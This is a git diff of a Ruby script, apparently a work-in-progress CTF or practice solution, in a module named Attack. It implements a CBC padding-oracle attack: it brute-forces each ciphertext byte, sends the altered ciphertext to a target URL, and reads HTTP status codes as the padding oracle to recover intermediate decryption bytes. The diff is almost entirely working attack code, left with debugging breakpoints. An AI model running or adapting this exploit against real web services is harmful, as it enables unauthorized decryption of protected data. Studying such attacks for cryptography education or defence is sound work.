@@ -12,6 +12,11 @@ class String
   def fix
     self[0...2].rjust(2, '0') #or ljust
   end
+
+  def ^( other )
+    longest = [self.length,other.length].max
+    (self.hex ^ other.hex).to_s(16).rjust(longest, '0')
+  end
 end
 
 module Attack
@@ -22,34 +27,43 @@ module Attack
 				@params = params	
 
 				@blocks = split_parms(params)
-				working_block = second_last_block(@blocks)
-				(1..BLOCKSIZE).each do |i|
-					byte_in_progress = BLOCKSIZE - i
-					working_block = chunk(working_block, 2)
-					working_block[byte_in_progress..(BLOCKSIZE - 1)] = i.to_s.fix
-					(0..255).each do |b|
-						byebug
-						working_block[byte_in_progress] = b.to_s(16).fix
-						response = call(working_block)
-						if response.code = 203
-							intermediate_byte = byte_in_progress xor i.to_s
-							intermediate_block[byte_in_progress] = intermediate_byte
-							exit
-						end
-					end	
+				@intermediate = []
+				@blocks.length.times do |progress|
+					intermediate_block = Array.new(16, "00")
+					(1..BLOCKSIZE).each do |i|
+						working_block = chunk(second_last_block(@blocks, progress), 2)
+						byte_in_progress = BLOCKSIZE - i
+						i.times {|count| working_block[BLOCKSIZE - (count + 1)] = (i.to_s.fix^intermediate_block[BLOCKSIZE - (count + 1)].fix).fix }
+						(0..255).each do |b|
+							working_block[byte_in_progress] = b.to_s(16).fix
+							response = call(working_block, progress)
+							if response.code == 404
+								intermediate_byte = (working_block[byte_in_progress]^i.to_s(16).fix).fix
+								intermediate_block[byte_in_progress] = intermediate_byte
+								puts intermediate_byte
+								break
+							elsif response.code == 200
+								puts "ERRRROROROROROROOR"
+								binding.pry
+							end
+						end	
+					end
+					@intermediate[progress + 1] = intermediate_block.join
 				end
-
 				binding.pry
 			end
 
-			def call(block)
-				@blocks[2] = block.join
-				HTTParty.get(TARGET + @blocks.join)
+			def call(block, progress)
+				#puts block.join
+				modified = @blocks[0..(progress + 1)]
+				modified[progress] = block.join
+				puts modified.join
+				HTTParty.get(TARGET + modified.join)
 			end
 
-			def second_last_block(array)
-				binding.pry
-				array[array.length - 2]
+			def second_last_block(array, block)
+				#@block_in_progress = (array.length - 2)
+				array[block] #lolwat
 			end
 
 
